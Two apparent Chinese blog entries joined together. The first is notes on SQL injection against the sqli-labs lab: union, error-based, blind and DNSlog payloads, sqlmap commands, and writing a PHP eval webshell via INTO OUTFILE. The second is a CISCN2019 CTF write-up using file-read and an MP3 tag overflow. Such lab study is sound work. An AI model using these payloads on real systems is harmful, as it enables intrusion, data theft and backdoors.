字符型数字型and 1=1和and 1=2都出现正常提示页面，则不可能是数字型注入当你是数字型的时候这个id 1=2是不能正常执行的 方法二： 1?id=2-1 字符型是不做运算的，查出来任然是2数字型是会做运算的 这里一般不用+号，+号有时候会被理解成空格 5.闭合方式是什么字符型需要闭合符，如下所示 1$scl=&quot;select * from users where id='$id' limit 0,1&quot;; 提交 1=and 1=1 1$scl=&quot;select * from users where id='1 and 1=1' limit 0,1&quot;; 里面的命令不会当成命令来执行 数字型则不需要闭合符来闭合 1$scl=&quot;select * from users where id=$id limit 0,1&quot;; 提交 and 1=2 1$scl=&quot;select * from users where id=$id and 1=2 limit 0,1&quot;; 6.如何判断闭合方式分析报错这里输入2’发现多了一个单引号报错了 7.闭合的作用是什么？手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号‘-+’或‘#或%23注释掉注释掉：利用注释符号暂时将程序段脱离运行。把某段程序“注释掉”，就是让它暂时不运行（而非删除掉） 8.什么是union联合注入联合查询注入 1?id=1' union select database ()--+ 上面会报错先判断前面的列数,如下语句判断 1234?id=1' group by 3 --+或者?id=1' order by 3 --+?id=1' union select 1,2,3 --+ UNION 要求前后两个查询的字段数量必须一致查询三个常量值 1,2,3只会读取第一行把它读取出来，然后把那个1修改成-1即可 1?id=-1' union select 1,2,3 --+ 1?id=-1' union select 1,version(),database() --+ 1.先查找注入点2.判断数字型还是字符型 and 1=1 1=2/ 3-13.如果是字符型，判断闭合方式 ' &quot; ') &quot;)4.判断查询列数，group by order by5.查询回显位 ?id=-1 'union select 1,2,3--+ sql前置1234cd D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\Extensions\\MySQL5.7.26\\binmysql -u root -p -P 8848//root是数据库名字 如果修改了phpstudy里的sql端口要在phpadmin如下路径下的 12D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\phpadmin\\phpMyAdmin4.8.5\\librariesconfig.default.php 然后修改成sql的端口 mysql增删改12345678910111213# 登录 MySQL（root 用户，-p 后不直接写密码更安全）mysql -u root -p# 提示输入密码时，输入正确密码后回车# 查看所有数据库（SQL 命令需以分号结尾）show databases;# 创建数据库 employees，指定字符集为 utf8（注意：utf8mb4 更推荐，支持完整 Unicode）create database employees charset utf8;# 或更推荐：create database employees charset utf8mb4;# 删除数据库 employees（危险操作，会直接删除所有数据）drop database employees; 12use employees;#使用数据库 1234567891011121314151617181920212223242526CREATE TABLE 表名 ( 字段1 数据类型 [约束条件], 字段2 数据类型 [约束条件], ...);CREATE TABLE employee ( id int, name varchar(40), sex char(4), birthday date, job varchar(100));#查看数据库信息show full columns from employee;#查看数据表列表select from employee;#删除数据表drop table employee;#修改数据表名称为userrename table employee to user;#修改字符级alter table user character set utf8; 12345678910111213insert into user(id, name, sex, birthday, job)values(1, 'ctfstu', 'male', '1999-05-06', 'it');#写入内容INSERT INTO users (id, name, sex, birthday, job)VALUES (1, 'ctfstu', 'male', '1999-05-06', 'it'); 1select * from user; 查看表 123alter table user add salary decimal(8,2);#增加一列 第一个数字 8 表示 总位数（整数部分 + 小数部分的总长度不能超过 8 位）。 第二个数字 2 表示 小数部分的位数（固定保留 2 位小数，例如 12345.67 是合法的，123456.78 则超过总位数限制）。 12345增加一行INSERT INTO user (id, name, sex, birthday, job)VALUES (10, 'xiaohong', 'female', '2006-03-15', 'designer');update user set salary=5000;#将所有salary值设置为5000 123update user set name='benben' where id=1;#将id=1的行name修改为benben 123update user set name='benben2',salary=6000 where id=1;#修改id=1的行name为benben2,工资为6000 123456789alter table user drop salary;#删除salary列delete from user where job='it';#删除某一行delete from user;#删除user表 数据库查询1234567891011121314INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it');#再加多行 123select * from user where id=1;#select+列名(*代表所有)from+表名 where+条件语句 1234567select * from user where id in ('3');#从user表查询所有id为3,和上面一样的效果select * from user where id=(select id from user where name=('admin'));#子查询，优先查询括号里面的#一般用在不知道id只知道name为admin的查询 1234567select id from user union select email_id from emailsselect from user where id=6 union select from emails where id=6;#ERROR:have a different number of columns联合注入前后表格列数必须相等select * from users where id=6 union select *,3 from emails where id=6;#3为填充列 emails 表本身只有 2 个字段，SELECT * FROM emails... 会返回 2 个字段。但语句中用 SELECT *, 3 ... 额外添加了一个固定值 3（作为第 3 个 “虚拟字段”），使得第二个查询的结果变成了 3 个字段（2 个来自 emails 表，1 个固定值）。字段必须相同 创建emails数据表 1234CREATE TABLE emails( id int, email_id varchar(40)); 插入数据 1234567891011INSERT INTO emails ( id, email_id) VALUES (1,'Dumb@dhakkan.com'), (2,'Angel@iloveu.com'), (3,'Dummy@dhakkan.Jocal'), (4,'secure@dhakkan.local'), (5,'stupid@dhakkan.local'), (6,'superman@dhakkan.local'), (7,'batman@dhakkan.local'), (8,'admin@dhakkan.com'); 1234567891011INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it'); group by对所有进行分组users表如果两个人名字相同，id不一样没问题，但是要是对大量分组就会容易报错 12345678select department,count(id) from student group by department;#查询department院系人数 count(id)对ID进行计数#一般用于二分法判断数据表列数select * from users where id=9 group by 2;#by2,4,8~~~依次排查到报错为止，从而确定列数；group by是按多少列排序select * from users where id=9 group by 4;select * from users order by 1; 按升序排序，第一列 12345select stu_id from score where c_name='计算机' order by grade desc;#grade参数desc使排列顺序变为降序#查询 “计算机” 这门课程的所有学生的学号，并按成绩从高到低排序select * from users limit 1,2; 上面应该是 1select * from users limit 0,2; 与和或 1234#两个条件需要同时满足select * from users where id=1 and username='benben';#两个条件有一个满足select * from users where id=1 or username='benben'; or在post提交里面做万能密码判断字符型还是数字型 group_concat 多行合并变一行 1select group_concat(id,username,password)from users; 把所有写到的类全合并 1select database() 查看当前数据库名称 1select version() 查看当前数据库的版本，防火墙绕过可以用到，例如什么注释符绕过 查看当前权限 1show grants; union注入1.了解union注入过程中用到的关键数据库、数据表、数据列2.sql查询中group_concat的作用 最终目标使用union注入拿到靶机中数据库里的所有用户名和密码。 拿到表名，列名 1.提前了解 1?id=1' union select 1,2,3--+ 回显位是2，3查数据库是security 1?id=1' union select 1,2,database()--+ 然后查数据表 1?id=-1' union select 1,2,table_name from information_schema.tables --+ 仅属于当前数据库的表 1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database() --+ 这里只能显示一个表名，那么我们需要一个group_concat 1?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 这里查到了所有数据表 紧接着就是列名 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns --+ 里面很多没啥用的，我们就看一个数据表的列名 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+ 查当前数据库中 users 表的所有字段名（列名） 然后查最终目标 12345?id=-1' union select 1,2,group_concat(username,password) from users --+或者?id=-1' union select 1,group_concat(username,password),3 from users --+ 小技巧，看起来不方便科如下操作 1?id=-1' union select 1,2,group_concat(username,&quot;~&quot;,password) from users --+ 数字型union注入数字型不需要判断闭合方式 1.确定数字型还是字符型2.使用group by的二分法判断union语句中前一个查询的列数3.优化语句，将d改为一个不存在的数字4.使用select语句，查询靶机数据库库名5.使用select语句，查询靶机所有表名6.使用select语句，查询靶机所有列名7.查询所有用户名密码 less-2判断是数字型注入用2-1 和1去比较，相同就是数字型 这里就不用去闭合了我们接着去判断列数，这里用order by判断是3列接着联合注入，记得要改成-1不然只会回显第一行 `` Post unionPOST提交和GET提交POST提交的使用HackBarPOST提交注入POST提交报错注入 POST提交和GET提交1.get提交可以被缓存，post提交不会2.get提交参数会保留在浏览器的历史记录里，post提交不会3.get提交可以被收藏为书签，post提交不会4.get提交有长度限制，最长2048个字符；post提交没有长度要求，不是只允许使用ASCII字符，还可以使用二进制数据有可能溢出绕过，waf防火墙只检查前面多少个数据，9000多个 post提交比get提交更安全 下面这个url在浏览器里面就是get提交被缓存 less-11源代码 1@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; 下面这是username万能密钥 1admin' or 1=1 # 代到上面的语句中就是 1@$sql=&quot;SELECT username, password FROM users WHERE username='admin' or 1=1 #' and password='$passwd' LIMIT 0,1&quot;; #把后面全注释掉了， 利用参数化查询避免SQL注入漏洞 post查数据库 1uname='union select 1,(select database()) #&amp;passwd=123&amp;Submit=Submit 判断列数 1uname=admin'group by 2#&amp;passwd=123&amp;submit=Submit post提交查字段 1uname='union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')#&amp;passwd=123&amp;Submit=Submit 查数据 1uname='union select 1,(select group_concat(username,&quot;:&quot;,password) from users)#&amp;passwd=123&amp;Submit=Submit 报错注入extractvalue什么是报错注入 构造语句，让错误信息中夹杂可以显示数据库内容的查询语句返回报错提示中包含数据库中的内容 ===1.通过floor()报错注入===*2.通过extractValue()报错注入**3.通过updateXml()报错注入*4.通过NAME_CONST()报错注入5.通过jion()报错注入6.通过exp()报错注入7.通过geometryCollection()报错注入8.通过polygon()报错注入9.通过multipoint()报错注入10.通过multlinestring()报错注入11.通过multpolygon()报错注入12.通过linestring()报错注入 先创建两个数据库 1234567891011121314151617181920212223242526272829303132create database ctfstu charset utf8;create table xml(doc varchar(150));insert into xml values('&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');insert into xml values('&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');select extractvalue(doc,'/book/author/surname')from xml; doc是列名，第二个是查询路径,查到的是benben 12345678&lt;book&gt; &lt;title&gt;A bad boy how to get a girlfriend&lt;/title&gt; &lt;author&gt; &lt;initial&gt;Love&lt;/initial&gt; &lt;surname&gt;benben&lt;/surname&gt; &lt;/author&gt; &lt;/book&gt;select extractvalue(doc,'~book/author/surname')from xml; 上面这个报错是有回显语句的，所以我们可以在报错前构造一个查询语句 1select extractvalue(doc,concat(0x7e,(select database()))) from xml; 上述是显示当前库名 less-5尝试构造以下语句 1?id=-1' union select 1,2,database() --+ 尝试故意写错database 1?id=-1' union select 1,2,datdbase() --+ 出现如下报错可以知道当前数据库的库名是security 1234?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+#0x7e就是~号extractvalue这里列可以随便写，为的就是报错 上述语句也可以查到库名是security 1?id=100' and 1=extractvalue(1,concat(0x7e,(select database()))) --+ 然后查表名 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3--+ 查到当前数据库表名继续查列名 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) ,3--+ 最后查数据 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) ,3--+ 报错注入一次只能返回32个字符，所以此时要用substringsubstring(“第一”,”第二·”,”第三”) 第一：就是字符第二：从哪一位开始显示第三：显示总共多少位字符如下所示 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),1,3) from users))) ,3--+ floor报错注入涉及到函数较多 rand()函数：随机返回0-1之间的小数floor()函数：小数向下取整，向上取整数ceiling()concat_ws()函数：将括号内数据用第一个字段连接起来group by:分组as:别名count()函数:汇总统计数量limit:这里用于显示指定行数 1234567891011121314151617181920212223?id=0' union select 1,count(*),concat_ws('-',(select concat('~',id,username,':',password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+select rand() #随机生成0-1select rand() #随机生成0-2select rand() from users #有多少行生成多少个随机数select floor(rand()*2); #随机0或者1，只有两个结果select concat_ws('-',2,3) #2-3,拼接select concat_ws('-',(select database()),floor(rand()*2)) #数据库名字-0/1select concat_ws('-',(select database()),floor(rand()*2)) as a from users group by a; #分组select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand()*2)) as a from users group by a; #执行不是每次报错select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand(0)*2)) as a from users group by a; #rand()改成rand(0)就会固定报错，改成1就会不报错select count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a;#输出库名?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2)) as a from users group by a --+#获取表名less-5?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(username,':',password) from users), floor(rand(0)*2)) as a from users group by a --+#group_concat无法显示，可以使用concat?id=-1' union select 1, count(*), concat_ws('-', (select concat(username,':',password) from users limit 0,1), floor(rand(0)*2)) as a from users group by a --+#查最终数据 这是分组 查最终数据 updatexml注入函数updatexml(XML_document,XPath_string,new_value)包含三个参数第一个参数：XML document是string格式，为XML文档对象的名称，例如Doc第二个参数：XPath string是路径，XPath:格式的字符串第三个参数：new_value,string格式，替换查找到的符合条件的数据 updatexml 正常句式 1select updatexml(doc,'/book/auther/surname','1') from xml; 错误句式 1select updatexml(doc,'~book/auther/surname','1') from xml; 查数据库，第二个参数会引起报错，从而回显数据库名字 1?id=1&quot; and 1=updatexml(1,concat('~',(select database())),3) --+ 查数据表 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+ 查列 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+ 然后查到这些个列名，最后查数据 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(id,username,password) from users)),3) --+ 这个限制长度了，用substring修改以下 1?id=1&quot; and 1=updatexml(1,concat('~',substring((select group_concat(id,username,password) from users),1,30)),3) --+ 盲注布尔盲注盲注：页面没有报错回显位，不知道数据库具体返回值的情况下，对数据库内容进行猜解，实行SQL注入 盲注分类：布尔盲注，时间盲注，报错注入 布尔盲注：web页面只返回True真，Flase假两种类型。利用页面返回不同，逐个猜解数据 用如下语句判断是否是布尔盲注 1?id=1' and 1=1 --+ 回复为真 1?id=1' and 1=2 --+ 回复为假 手动注入找到waf 关键函数函数ascii() ascii美国信息交换标准代码，可以把字母转换成对应数字 1select ascii('A') 1234?id=1' and ascii(substr((select database()),1,1))&gt;=101 --+(select database())substr((select database()),1,1)ascii(substr((select database()),1,1)) 大于等于115可以116不行所以第一个字符就是115 第二个字符 1?id=1' and ascii(substr((select database()),2,1))&gt;=101 --+ 依次去试 1?id=1'and ascii(substr('abcd',1,1))&gt;97 --+ 把abcd替换成要查询的语句即可 查表名limit 0,1 表示获取第 1 个表名 12?id=1' and ascii(substr((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),1,1))&gt;100 --+ 查列名 12?id=1' and ascii(substr((select column_name from information_schema.columns wheretable_schema=database() and table_name='users' limit 0,1),1,1))&gt;100 --+ 查数据 12?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;100 --+?id=1' and ascii(substr((select password from users limit 0,1),1,1))&gt;100 --+ 时间盲注时间盲注：web页面只返回一个正常页面，利用页面响应时间不同逐个猜解数据 前提是数据库会执行命令代码，只是不反馈页面信息 前提是数据库会执行命令代码，只是不反馈页面信息 关键函数函数sleep() 参数为休眠时长，以秒为单位，可以为小数 1select sleep(2) less-9输入 1?id=1 他是对的然后后面随便输不会变 1?id=1 and sleep(3) --+ 如果是数字型，她会延迟3秒才显示，这里它立马就回显了，显然不是数字型 然后判断是什么闭合,可以看到单引号等了3秒才回显，说明单引号闭合 1select if(1=1,sleep(0),sleep(3)); 这句话的意思是1=1为真就执行休眠0秒 1?id=1' and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+ 比大小猜解，然后通过时间响应判断条件是否成立 最终得到数据库名字的首字母是114rd 查询表 1234?id=1' and if(ascii(substr ((table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1' and if(ascii(substr ((column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1'and if(ascii(substr((select username from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+ dnslog注入盲注的一种，sqlmap，比盲注效率要高,可以一组一组，一行一行的出来 对当前服务器读写的权限要打开如果不能做SQL注入文件上传，那么这个也做不了 1select load_file(&quot;C:\\\\benben.txt&quot;); UNC路径格式：servername\\sharename,其中servername:是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory \\filename。其实我们平常在Vidnows中用共享文件的时候就会用到这种网络地址的形式sss.xxxltest 查看本地文件 先查数据库 1?id=1'and select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;1.j96k1p.ceye.io\\\\1.txt&quot;))--+ 查数据表 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ 这里limit 0，1是显示第一个表名emails 是从0开始只显示一个limit 1,1 是从1开始只显示一个 列名 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ 工具注入DnslogSqlinj 1234567891011121314151617181920Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+Options: --version show program's version number and exit -h, --help show this help message and exit -n TASKNAME, --name=TASKNAME task name -t THREAD_COUNT, --thread=THREAD_COUNT thread_count -u URL, --url=URL target include injection -i INF, --inf=INF Testing target and Try to get information --dbs get database -D DB database name --tables get table -T TABLE table name --columns get column -C COLUMN column name --dump get **data**D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://sqli:8088/Less-9/?id=1' and ({})--+&quot;D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+&quot; -D security --tables 1sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; -D security -T users -C username,password --dump --time-sec 2 sql注入文件上传文件上传拿webshell 判断mysql是否有文件读写权限 12show variables like '%secure%';#用来查看mysql是否有读写文件权限 这里NULL是没有文件读写权限的我们在mysql下面的my.ini文件里面的[mysqld]组下面加一行 1secure_file_priv=&quot;&quot; 然后就有文件读写权限了 1.show variables like’%secure%’;用来查看mysql是否有读写文件权限；2.数据库的fle权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限；3.into outfile命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径。 less-7两个双引号不报错的原因是因为双引号被两个单引号闭合，失去单引号的作用是如下闭合方式 1?id=1')) 有个法子可以判断到底是不是两个单引号闭合 1?id=1'' and 1=2 --+ 这显然是不成立的，但是任然不报错，可以看到那么这就不是两个单引号闭合 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\ben.php&quot;--+ &lt;?php@eval($_POST['password]);?&gt;为一句话木马password为预留密码D:\\\\phpstudy._pro\\\\WWWW\\\\为文件路径ben.php为新插入的文件名 1?id=-1')) union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\Soft\\\\Penetration\\\\TrafficTools\\\\phpStudy\\\\WWW\\\\ben.php&quot; --+ 这里写好注入，文件上传成功，然后用蚁剑连接这里连接地址就是 1http://localhost/ben.php 查看权限，这是本机的一个管理员用户 linux的话是 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&quot;,3 into outfile &quot;/var/www/heml/test/ben.php&quot;--+ 上传大马反弹拿web shell","link":"/2025/12/11/Sql%E6%B3%A8%E5%85%A5/"},{"title":"","text":"CISCN2019 总决赛 Day1 Web1–滑稽云音乐 打开环境，F12就看到提示了 大概就是firmware有个关键点、需要管理员这里我们不知道密码所以先尝试注册一个登录进去 注册这个 1md5(code+&quot;MWQIRZQf&quot;)[:5]==&quot;e4e62&quot; 大概就是验证码逻辑写个脚本去爆 1234567891011121314import hashlib def find_code(): target_prefix = &quot;e4e62&quot; suffix = &quot;MWQIRZQf&quot; for i in range(1000000): # 假设 code 是一个整数，可以调整范围 code = str(i) combined = code + suffix hash_value = hashlib.md5(combined.encode()).hexdigest() if hash_value[:5] == target_prefix: return code code = find_code() print(&quot;Found code:&quot;, code) 注册成功，登陆进去 这里bota替换掉 1234cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==php://filter/read=convert.base64-encode/resource=share.php 然后去curl源码 123456789101112131415161718192021222324252627282930313233C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==&quot;#share.php&lt;?php# For sharing files in /media directory, do not delete, you can modify# 分享功能，用来分享/media文件夹下的文件。不可删除，可以按需修改。ini_set('display_errors','Off');error_reporting(0);header('Content-Type: application/octet-stream');$filepath=base64_decode($_SERVER['QUERY_STRING']);if (strlen($filepath)&lt;=0) exit();$file=fopen($filepath,&quot;rb&quot;);if ($file==FALSE) exit();ob_clean();while(!feof($file)){ print(fread($file,1024*8)); ob_flush(); flush();}curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2hvdGxvYWQucGhw&quot;php://filter/read=convert.base64-encode/resource=../hotload.php#hotload.php&lt;?phpinclude_once 'include/config.php';@$page=$_GET['page'];if (isset($page)) $page=(string) $page;if (!isset($page)||strlen($page)&lt;=0) $page='index';$whitelist=array('index','fm','mv','friend','disk','upload','share','favor','login','reg','feedback','firmware','search','logout','info');if (!in_array($page,$whitelist,true)) $page='404';include &quot;include/$page.php&quot;; 上面代码看到Open: Pasted image 20251106201520 1.png 读取 12345678910111213141516171819202122232425C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvY29uZmlnLnBocA==&quot;php://filter/read=convert.base64-encode/resource=../include/config.php#config.php&lt;?phpini_set('display_errors','Off');error_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set('session.gc_maxlifetime',&quot;3600&quot;);ini_set(&quot;session.cookie_lifetime&quot;,&quot;3600&quot;);session_start();include 'init.php';$_GLOBALS['dbfile']=init_config('.sqlite');$_GLOBALS['salt']=write_config(init_config('.salt'));$_GLOBALS['admin_password']=write_config(init_config('.passwd'));if (strlen($_GLOBALS['dbfile'])&lt;=0||strlen($_GLOBALS['salt'])&lt;=0||strlen($_GLOBALS['admin_password'])&lt;=0){ ob_end_clean(); die('Permission denied!');}$_GLOBALS['dbfile']=__DIR__.'/../config/'.$_GLOBALS['dbfile'];?&gt; 看到init.php看一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php@mkdir(__DIR__.'/../config/');function rand_str($length = 16) { $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i &lt; $length; $i++) { $randomString .= $characters[mt_rand(0, $charactersLength - 1)]; } return $randomString;}function get_filename($ext){ $files=scandir(__DIR__.'/../config/'); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { if (substr($file,-strlen($ext))===$ext){ return $file; } } } return '';}function init_config($ext){ $file=get_filename($ext); if ($file==''){ $file=rand_str(8).$ext; file_put_contents(__DIR__.'/../config/'.$file, ''); if (!file_exists(__DIR__.'/../config/'.$file)){ $file==''; } } return $file;}function read_config($file){ return file_get_contents(__DIR__.'/../config/'.$file);}function write_config($file,$str = '',$length = 16){ $content=file_get_contents(__DIR__.'/../config/'.$file); if ($content==''){ if ($str=='') $str=rand_str($length); file_put_contents(__DIR__.'/../config/'.$file, $str); } return file_get_contents(__DIR__.'/../config/'.$file);}?&gt; 这里是看一下 parser.so文件从init_proc看起 123456789__int64 (**init_proc_0())(void){ __int64 (**__gmon_start_)(void); // rax __gmon_start_ = &amp;_gmon_start__; if ( &amp;_gmon_start__ ) return (__int64 (**)(void))_gmon_start__(); return __gmon_start_;} 没什么好看的继续看 123456789#init_procvoid *init_proc(){ frame_size = 0; frame_data = &amp;frame_data; memset(&amp;frame_data, 0, 0x100u); passwd = &amp;passwd; return memset(&amp;passwd, 0, 0x130u);} 第一次接触用pwn的web漏洞，喂给AI看一下 其中&amp;passwd在bss段中为93c0，而上面的&amp;frame_data在92c0。 frame_data 占用了 0x100 字节（256 字节），从 92C0 到 93C0 是连续的。 passwd 的起始地址为 93C0，说明它紧跟在 frame_data 之后。 如果对 frame_data 的数据写入超过了 0x100 字节，就可能越界到 passwd 的地址空间。由于PHP中的文件限制长度为0x130字节，因此有0x30的溢出读空间。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python3 # coding:utf-8 # 专为 Python3 编写，无任何编码/拼接报错 def flat(*args): &quot;&quot;&quot;字节流拼接函数（仅处理字节类型，彻底避免类型错误）&quot;&quot;&quot; result = b&quot;&quot; for arg in args: if isinstance(arg, bytes): result += arg else: # 强制转换为字节（确保所有输入统一类型） raise TypeError(f&quot;仅支持 bytes 类型，传入了 {type(arg)}&quot;) return result # 1. 按你提供的结构，所有内容转为 bytes 类型（核心修改） mp3_tag = flat( b'ID3', # 标签标识（bytes） b'\\x03', # 主版本号（bytes） b'\\x00', # 修订号（bytes） b'\\x00', # 标志位（bytes） b'\\x00\\x00\\x04\\x00', # 标签头大小（bytes） b'TIT2', # 帧标识（bytes） b'\\x00\\x00\\x00\\x0a', # TIT2 帧大小（bytes） b'\\x00\\x00', # TIT2 帧标志（bytes） b'a'*9 + b'\\x00', # TIT2 内容（bytes，9个'a' + 结束符） b'TPE1', # 帧标识（bytes） b'\\x00\\x00\\x00\\x0a', # TPE1 帧大小（bytes） b'\\x00\\x00', # TPE1 帧标志（bytes） b'b'*9 + b'\\x00', # TPE1 内容（bytes，9个'b' + 结束符） b'TALB', # 帧标识（bytes） b'\\x00\\x00\\x02\\xff', # TALB 帧大小（bytes，按你提供的配置） b'\\x00\\x00', # TALB 帧标志（bytes） b'c'*0x200 + b'\\x00', # TALB 内容（bytes，512个'c' + 结束符） ) # 2. 添加标准 MP3 音频帧（确保文件被识别为有效 MP3，不报错） # 标准 MPEG-1 Layer 3 音频帧（44.1kHz 单声道，128kbps，持续0.5秒） mp3_audio = ( b'\\xff\\xf3\\xc4\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' ) # 3. 拼接标签 + 音频，生成完整 MP3 文件 full_mp3 = mp3_tag + mp3_audio # 4. 写入文件（二进制模式，Python3 标准写法） output_file = &quot;fake_mp3_no_error.mp3&quot; with open(output_file, &quot;wb&quot;) as f: f.write(full_mp3) print(f&quot;✅ 零报错！伪造 MP3 已生成：{output_file}&quot;) print(f&quot;📌 标签结构完全按你的配置：ID3v2.3 + TIT2/TPE1/TALB 帧&quot;) print(f&quot;🎵 包含有效音频帧，可正常播放/上传绕过&quot;) 得到密码wc4I22tosZFIsUIk 用admin登录进去 也是成功登录了 来到/#firmware页面 这里老方法读取一下frimware代码 1curl -v &quot;http://af97e55c-3987-499d-99e5-e8acff7feafd.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvZmlybXdhcmUucGhw&quot; 